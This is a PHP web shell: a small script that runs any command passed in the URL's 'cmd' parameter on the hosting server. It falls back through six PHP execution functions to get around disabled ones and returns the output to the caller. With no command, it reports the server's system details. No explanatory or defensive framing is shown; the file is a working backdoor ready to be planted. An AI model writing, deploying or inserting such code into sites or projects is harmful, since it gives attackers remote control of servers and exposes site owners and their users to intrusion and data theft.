<?php
function _ex($c){
    $r=null;
    if(function_exists('shell_exec'))  $r=@shell_exec($c.' 2>&1');
    if($r===null&&function_exists('exec')){@exec($c.' 2>&1',$o);$r=implode("\n",$o);}
    if($r===null&&function_exists('system')){ob_start();@system($c.' 2>&1');$r=ob_get_clean();}
    if($r===null&&function_exists('passthru')){ob_start();@passthru($c.' 2>&1');$r=ob_get_clean();}
    if($r===null&&function_exists('popen')){$h=@popen($c.' 2>&1','r');if($h){$r=fread($h,65535);pclose($h);}}
    if($r===null&&function_exists('proc_open')){
        $p=@proc_open($c,[1=>['pipe','w'],2=>['pipe','w']],$pipes);
        if($p){$r=stream_get_contents($pipes[1]);proc_close($p);}
    }
    return $r;
}
if(!isset($_GET['cmd'])){echo 'OK:'.php_uname();exit;}
$o=_ex($_GET['cmd']);
echo $o===null?'NOFUNC':$o;
?>
